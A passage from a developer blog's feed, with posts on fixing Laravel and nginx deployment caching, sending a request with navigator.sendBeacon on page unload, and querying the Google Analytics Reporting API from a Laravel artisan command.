config(<span class="string">&#x27;app.key&#x27;</span>);</span></span><br></pre></td></tr></table></figure><p>Finally, I solve it by restarting fpm</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo service php7.<span class="number">3</span>-fpm restart</span><br></pre></td></tr></table></figure><h3 id="6-After-deployed-server-still-serve-the-old-revision"><a href="#6-After-deployed-server-still-serve-the-old-revision" class="headerlink" title="6. After deployed, server still serve the old revision"></a>6. After deployed, server still serve the old revision</h3><p>Update your nginx config</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">location ~ .php$ &#123;</span><br><span class="line">    try_files <span class="variable">$uri</span> =<span class="number">404</span>;</span><br><span class="line">    fastcgi_split_path_info ^(.+.php)(/.+)$;</span><br><span class="line">    fastcgi_pass   unix:<span class="regexp">/var/</span>run<span class="regexp">/php/</span>php7.<span class="number">3</span>-fpm.sock;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add this 2 line after `include`</span></span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  <span class="variable">$realpath_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">    fastcgi_param  DOCUMENT_ROOT <span class="variable">$realpath_root</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Then restart nginx</p><p><a href="https://serverfault.com/questions/848503/nginx-caching-symlinks/848526#848526">See the explaination here</a></p><p>Hope this article help :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’ve been heard of continuous integration long ago, thus I decide to give it a try.&lt;br&gt;I found &lt;a</summary>
        
      
    
    
    
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="nginx" scheme="http://jslim.net/tags/nginx/"/>
    
    <category term="deployment" scheme="http://jslim.net/tags/deployment/"/>
    
    <category term="gitlab" scheme="http://jslim.net/tags/gitlab/"/>
    
  </entry>
  
  <entry>
    <title>window.onbeforeunload trigger ajax request</title>
    <link href="http://jslim.net/blog/2019/04/17/window-onbeforeunload-trigger-ajax-request/"/>
    <id>http://jslim.net/blog/2019/04/17/window-onbeforeunload-trigger-ajax-request/</id>
    <published>2019-04-17T10:28:42.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>Initially I was using jQuery.ajax call to send a request to server before user<br>leave the page.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onbeforeunload</span> = <span class="keyword">function</span>(<span class="params">evt</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> endpoint = <span class="string">&#x27;/lock/end-timestamp.php&#x27;</span>;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: endpoint,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="attr">async</span>: <span class="literal">false</span>, <span class="comment">// synchronous request</span></span><br><span class="line">        <span class="attr">data</span>: &#123;</span><br><span class="line">            <span class="attr">_token</span>: $(<span class="string">&#x27;meta[name=&quot;csrf-token&quot;]&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;content&#x27;</span>),</span><br><span class="line">            <span class="attr">param1</span>: <span class="string">&#x27;data1&#x27;</span>,</span><br><span class="line">            <span class="attr">param2</span>: <span class="string">&#x27;data2&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>And I set the <strong>async</strong> to <code>false</code>, it doesn’t work.</p><p>After googled, I found a better solution <code>navigator.sendBeacon</code>, and it works well.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onbeforeunload</span> = <span class="keyword">function</span>(<span class="params">evt</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> endpoint = <span class="string">&#x27;/lock/end-timestamp.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">    formData.<span class="title function_">append</span>(<span class="string">&#x27;_token&#x27;</span>, $(<span class="string">&#x27;meta[name=&quot;csrf-token&quot;]&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;content&#x27;</span>));</span><br><span class="line">    formData.<span class="title function_">append</span>(<span class="string">&#x27;param1&#x27;</span>, <span class="string">&#x27;data1&#x27;</span>);</span><br><span class="line">    formData.<span class="title function_">append</span>(<span class="string">&#x27;param2&#x27;</span>, <span class="string">&#x27;data2&#x27;</span>);</span><br><span class="line">    navigator.<span class="title function_">sendBeacon</span>(endpoint, formData);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>References:</p><ul><li><a href="https://stackoverflow.com/questions/4945932/window-onbeforeunload-ajax-request-in-chrome">window.onbeforeunload ajax request in Chrome</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon">Navigator.sendBeacon()</a></li><li><a href="http://usefulangle.com/post/63/javascript-navigator-sendbeacon-set-form-http-header">Setting HTTP Headers in a Beacon Request</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Initially I was using jQuery.ajax call to send a request to server before user&lt;br&gt;leave the page.&lt;/p&gt;
&lt;figure class=&quot;highlight</summary>
        
      
    
    
    
    
    <category term="javascript" scheme="http://jslim.net/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Use Google Analytics API with Laravel 5</title>
    <link href="http://jslim.net/blog/2019/04/02/Use-Google-Analytics-API-with-Laravel-5/"/>
    <id>http://jslim.net/blog/2019/04/02/Use-Google-Analytics-API-with-Laravel-5/</id>
    <published>2019-04-02T12:22:48.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>No doubt that Google is very powerful. I’ve been researching for<br>Google Analytics <em>(GA)</em> API for quite sometime, due to it’s complex documentation<br><em>(somehow I think is very hard to find what I need)</em>.</p><p>I will show the demo in <a href="https://laravel.com/docs/5.8/artisan">Laravel command</a>,<br>it’s easier and comfortable for me.</p><h2 id="1-Request-API-key"><a href="#1-Request-API-key" class="headerlink" title="1. Request API key"></a>1. Request API key</h2><p>First, we must <a href="https://developers.google.com/analytics/devguides/reporting/core/v3/quickstart/service-php">create a service account</a> in order to call the API.</p><p><img src="/images/posts/2019-04-02-Use-Google-Analytics-API-with-Laravel-5/service-account.png" alt="Google service account"></p><p>Once you create, you will download the key file.</p><h2 id="2-Grant-your-service-account-to-access-Google-Analytics"><a href="#2-Grant-your-service-account-to-access-Google-Analytics" class="headerlink" title="2. Grant your service account to access Google Analytics"></a>2. Grant your service account to access Google Analytics</h2><p>Without this step, you won’t be able to get any data. Because GA will treat<br>the service account as an actual account, must grant at least a READ access.</p><p><img src="/images/posts/2019-04-02-Use-Google-Analytics-API-with-Laravel-5/ga-add-user-step-1.png" alt="Google Analytics add user"></p><p>Let’s add the service account user to <strong>View</strong> level.</p><p><img src="/images/posts/2019-04-02-Use-Google-Analytics-API-with-Laravel-5/ga-add-user-step-2.png" alt="Google Analytics add user"></p><p>Remember to set the permission to readonly</p><h2 id="3-Make-use-of-Google-SDK"><a href="#3-Make-use-of-Google-SDK" class="headerlink" title="3. Make use of Google SDK"></a>3. Make use of <a href="https://github.com/google/google-api-php-client">Google SDK</a></h2><p>In Laravel project, run this</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>composer <span class="keyword">require</span> google/<span class="symbol">apiclient:</span>^<span class="number">2.0</span></span><br></pre></td></tr></table></figure><p>After installed, then create a command for testing</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">php artisan make:<span class="built_in">command</span> GetGAResult</span></span><br></pre></td></tr></table></figure><p>Now let’s edit the file</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="string">&#x27;2019-01-01&#x27;</span>;</span><br><span class="line">    <span class="variable">$end</span> = <span class="string">&#x27;2019-03-31&#x27;</span>;</span><br><span class="line">    <span class="variable">$ga_id</span> = <span class="string">&#x27;UA-123456789-3&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// define what you need here</span></span><br><span class="line">    <span class="variable">$fields</span> = [</span><br><span class="line">        <span class="string">&#x27;metrics&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;ga:pageviews&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;ga:uniquePageviews&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&#x27;dimensions&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;ga:pagePath&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If you want to know more about what to know about what are the fields available,<br>can <a href="https://ga-dev-tools.appspot.com/query-explorer/">refer here</a>.</p><p><img src="/images/posts/2019-04-02-Use-Google-Analytics-API-with-Laravel-5/query-explorer.png" alt="Query explorer"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getGADataByDate</span>(<span class="params"><span class="variable">$ga_id</span>, <span class="variable">$start_date</span>, <span class="variable">$end_date</span>, <span class="variable">$fields</span>, <span class="variable">$callback</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">\Google_Client</span>();</span><br><span class="line">    <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">setApplicationName</span>(<span class="string">&#x27;My report&#x27;</span>);</span><br><span class="line">    <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">setAuthConfig</span>(<span class="string">&#x27;/path/to/service-account-credential.json&#x27;</span>);</span><br><span class="line">    <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">setScopes</span>([<span class="title class_">\Google_Service_Analytics</span>::<span class="variable constant_">ANALYTICS_READONLY</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the view ID</span></span><br><span class="line">    <span class="variable">$analytics</span> = <span class="keyword">new</span> <span class="title class_">\Google_Service_Analytics</span>(<span class="variable">$client</span>);</span><br><span class="line">    <span class="variable">$accounts</span> = <span class="variable">$analytics</span>-&gt;management_accounts-&gt;<span class="title function_ invoke__">listManagementAccounts</span>();</span><br><span class="line">    <span class="variable">$items</span> = <span class="variable">$accounts</span>-&gt;<span class="title function_ invoke__">getItems</span>();</span><br><span class="line">    <span class="variable">$first_account</span> = <span class="variable">$items</span>[<span class="number">0</span>]-&gt;<span class="title function_ invoke__">getId</span>();</span><br><span class="line">    <span class="variable">$profiles</span> = <span class="variable">$analytics</span>-&gt;management_profiles</span><br><span class="line">        -&gt;<span class="title function_ invoke__">listManagementProfiles</span>(<span class="variable">$first_account</span>, <span class="string">&#x27;~all&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$profiles</span>-&gt;<span class="title function_ invoke__">getItems</span>() <span class="keyword">as</span> <span class="variable">$profile</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$ga_id</span> == <span class="variable">$profile</span>-&gt;<span class="title function_ invoke__">getWebPropertyId</span>()) &#123;</span><br><span class="line">            <span class="variable">$view_id</span> = <span class="variable">$profile</span>-&gt;<span class="title function_ invoke__">getId</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$view_id</span>)) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;GA view ID not found for %s.&#x27;</span>, <span class="variable">$ga_id</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// begin retrieve report</span></span><br><span class="line">    <span class="variable">$ga_reporting</span> = <span class="keyword">new</span> <span class="title class_">\Google_Service_AnalyticsReporting</span>(<span class="variable">$client</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$date_range</span> = <span class="keyword">new</span> <span class="title class_">\Google_Service_AnalyticsReporting_DateRange</span>();</span><br><span class="line">    <span class="variable">$date_range</span>-&gt;<span class="title function_ invoke__">setStartDate</span>(<span class="variable">$start_date</span>);</span><br><span class="line">    <span class="variable">$date_range</span>-&gt;<span class="title function_ invoke__">setEndDate</span>(<span class="variable">$end_date</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$metrics</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$fields</span>[<span class="string">&#x27;metrics&#x27;</span>] <span class="keyword">as</span> <span class="variable">$metric_conf</span>) &#123;</span><br><span class="line">        <span class="variable">$metric</span> = <span class="keyword">new</span> <span class="title class_">\Google_Service_AnalyticsReporting_Metric</span>();</span><br><span class="line">        <span class="variable">$metric</span>-&gt;<span class="title function_ invoke__">setExpression</span>(<span class="variable">$metric_conf</span>);</span><br><span class="line">        <span class="variable">$metric</span>-&gt;<span class="title function_ invoke__">setAlias</span>(<span class="variable">$metric_conf</span>);</span><br><span class="line">        <span class="variable">$metrics</span>[] = <span class="variable">$metric</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$dimensions</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$fields</span>[<span class="string">&#x27;dimensions&#x27;</span>] <span class="keyword">as</span> <span class="variable">$dimension_conf</span>) &#123;</span><br><span class="line">        <span class="variable">$dimension</span> = <span class="keyword">new</span> <span class="title class_">\Google_Service_AnalyticsReporting_Dimension</span>();</span><br><span class="line">        <span class="variable">$dimension</span>-&gt;<span class="title function_ invoke__">setName</span>(<span class="variable">$dimension_conf</span>);</span><br><span class="line">        <span class="variable">$dimensions</span>[] = <span class="variable">$dimension</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sort by pageviews</span></span><br><span class="line">    <span class="variable">$sort</span> = <span class="keyword">new</span> <span class="title class_">\Google_Service_AnalyticsReporting_OrderBy</span>();</span><br><span class="line">    <span class="variable">$sort</span>-&gt;<span class="title function_ invoke__">setSortOrder</span>(<span class="string">&#x27;DESCENDING&#x27;</span>);</span><br><span class="line">    <span class="variable">$sort</span>-&gt;<span class="title function_ invoke__">setOrderType</span>(<span class="string">&#x27;VALUE&#x27;</span>);</span><br><span class="line">    <span class="variable">$sort</span>-&gt;<span class="title function_ invoke__">setFieldName</span>(<span class="string">&#x27;ga:pageviews&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ga_request</span> = <span class="keyword">new</span> <span class="title class_">\Google_Service_AnalyticsReporting_ReportRequest</span>();</span><br><span class="line">    <span class="variable">$ga_request</span>-&gt;<span class="title function_ invoke__">setViewId</span>((<span class="keyword">string</span>)<span class="variable">$view_id</span>);</span><br><span class="line">    <span class="variable">$ga_request</span>-&gt;<span class="title function_ invoke__">setDateRanges</span>(<span class="variable">$date_range</span>);</span><br><span class="line">    <span class="variable">$ga_request</span>-&gt;<span class="title function_ invoke__">setPageSize</span>(<span class="number">10</span>); <span class="comment">// pagination, total retrieve per request</span></span><br><span class="line">    <span class="variable">$ga_request</span>-&gt;<span class="title function_ invoke__">setMetrics</span>(<span class="variable">$metrics</span>);</span><br><span class="line">    <span class="variable">$ga_request</span>-&gt;<span class="title function_ invoke__">setDimensions</span>(<span class="variable">$dimensions</span>);</span><br><span class="line">    <span class="variable">$ga_request</span>-&gt;<span class="title function_ invoke__">setOrderBys</span>([<span class="variable">$sort</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$body</span> = <span class="keyword">new</span> <span class="title class_">\Google_Service_AnalyticsReporting_GetReportsRequest</span>();</span><br><span class="line">    <span class="variable">$body</span>-&gt;<span class="title function_ invoke__">setReportRequests</span>([<span class="variable">$ga_request</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$ga_reporting</span>-&gt;reports-&gt;<span class="title function_ invoke__">batchGet</span>(<span class="variable">$body</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">info</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Getting page %d&#x27;</span>, <span class="number">1</span>));</span><br><span class="line">    <span class="variable">$callback</span>(<span class="variable">$data</span>-&gt;reports[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$page</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$total_pages</span> = <span class="number">5</span>; <span class="comment">// total number of pages to retrieve</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$data</span>-&gt;reports[<span class="number">0</span>]-&gt;nextPageToken &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$page</span> &lt; <span class="variable">$total_pages</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">info</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Getting page %d&#x27;</span>, (<span class="variable">$page</span> + <span class="number">1</span>)));</span><br><span class="line">        <span class="comment">// There are more rows for this report. we apply the next page token to the page token of the orignal body.</span></span><br><span class="line">        <span class="variable">$body</span>-&gt;reportRequests[<span class="number">0</span>]-&gt;<span class="title function_ invoke__">setPageToken</span>(<span class="variable">$data</span>-&gt;reports[<span class="number">0</span>]-&gt;nextPageToken);</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$ga_reporting</span>-&gt;reports-&gt;<span class="title function_ invoke__">batchGet</span>(<span class="variable">$body</span>);</span><br><span class="line">        <span class="variable">$callback</span>(<span class="variable">$data</span>-&gt;reports[<span class="number">0</span>]); <span class="comment">// due to too much data, get by chunk</span></span><br><span class="line">        <span class="variable">$page</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now, let’s update the <code>handle()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// later will output in table form</span></span><br><span class="line">    <span class="variable">$headers</span> = [<span class="string">&#x27;Page&#x27;</span>, <span class="string">&#x27;Pageviews&#x27;</span>, <span class="string">&#x27;Unique pageviews&#x27;</span>];</span><br><span class="line">    <span class="variable">$final_results</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$ga_id</span>, <span class="variable">$start</span>, <span class="variable">$end</span>, <span class="variable">$fields</span>, function (<span class="variable">$report</span>) <span class="keyword">use</span> ($<span class="title">fields</span>, &amp;$<span class="title">final_results</span>) &#123;</span><br><span class="line">        <span class="title">if</span> (<span class="title">empty</span>($<span class="title">report</span>)) <span class="title">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$rows</span> = <span class="variable">$report</span>-&gt;<span class="title function_ invoke__">getData</span>()-&gt;<span class="title function_ invoke__">getRows</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$rows</span> <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="variable">$dimensions</span> = <span class="variable">$row</span>-&gt;<span class="title function_ invoke__">getDimensions</span>();</span><br><span class="line">            <span class="variable">$metrics</span> = <span class="variable">$row</span>-&gt;<span class="title function_ invoke__">getMetrics</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$page_path</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$pageviews</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="variable">$unique_pageviews</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// metrics</span></span><br><span class="line">            <span class="variable">$metric</span> = <span class="variable">$metrics</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="variable">$metric_values</span> = <span class="variable">$metric</span>-&gt;<span class="title function_ invoke__">getValues</span>();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$metric_values</span> <span class="keyword">as</span> <span class="variable">$j</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$fields</span>[<span class="string">&#x27;metrics&#x27;</span>][<span class="variable">$j</span>] == <span class="string">&#x27;ga:pageviews&#x27;</span>) &#123;</span><br><span class="line">                    <span class="variable">$pageviews</span> = <span class="variable">$value</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$fields</span>[<span class="string">&#x27;metrics&#x27;</span>][<span class="variable">$j</span>] == <span class="string">&#x27;ga:uniquePageviews&#x27;</span>) &#123;</span><br><span class="line">                    <span class="variable">$unique_pageviews</span> = <span class="variable">$value</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// dimensions</span></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$dimensions</span> <span class="keyword">as</span> <span class="variable">$j</span> =&gt; <span class="variable">$dimension</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$fields</span>[<span class="string">&#x27;dimensions&#x27;</span>][<span class="variable">$j</span>] == <span class="string">&#x27;ga:pagePath&#x27;</span>) &#123;</span><br><span class="line">                    <span class="variable">$page_path</span> = <span class="variable">$dimension</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$final_results</span>[] = [</span><br><span class="line">                <span class="variable">$page_path</span>,</span><br><span class="line">                <span class="variable">$pageviews</span>,</span><br><span class="line">                <span class="variable">$unique_pageviews</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">table</span>(<span class="variable">$headers</span>, <span class="variable">$final_results</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now, let’s try it</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan <span class="keyword">get</span>-ga-<span class="literal">result</span></span><br></pre></td></tr></table></figure><p>Here’s the output</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+-------------------------------------------------------------------------+-----------+------------------+</span><br><span class="line">| Page                                                                    | Pageviews | Unique pageviews |</span><br><span class="line">+-------------------------------------------------------------------------+-----------+------------------+</span><br><span class="line">| <span class="regexp">/blog/</span><span class="number">2018</span><span class="regexp">/03/</span><span class="number">13</span><span class="regexp">/Angular-4-download-file-from-server-via-http/</span>          | <span class="number">157</span>       | <span class="number">146</span>              |</span><br><span class="line">| <span class="regexp">/blog/</span><span class="number">2016</span><span class="regexp">/06/</span><span class="number">06</span><span class="regexp">/aws-ec2-enable-remote-access-on-mysql/</span>                 | <span class="number">21</span>        | <span class="number">20</span>               |</span><br><span class="line">| <span class="regexp">/blog/</span><span class="number">2015</span><span class="regexp">/12/</span><span class="number">28</span><span class="regexp">/laravel-dompdf-set-custom-paper-size/</span>                  | <span class="number">9</span>         | <span class="number">9</span>                |</span><br><span class="line">| <span class="regexp">/blog/</span><span class="number">2012</span><span class="regexp">/12/</span><span class="number">28</span><span class="regexp">/ajax-change-dropdown-list-value-with-jquery/</span>           | <span class="number">8</span>         | <span class="number">8</span>                |</span><br><span class="line">| <span class="regexp">/blog/</span><span class="number">2014</span><span class="regexp">/07/</span><span class="number">14</span><span class="regexp">/remove-the-1px-shadow-from-uisearchbar/</span>                | <span class="number">6</span>         | <span class="number">5</span>                |</span><br><span class="line">| <span class="regexp">/blog/</span><span class="number">2018</span><span class="regexp">/01/</span><span 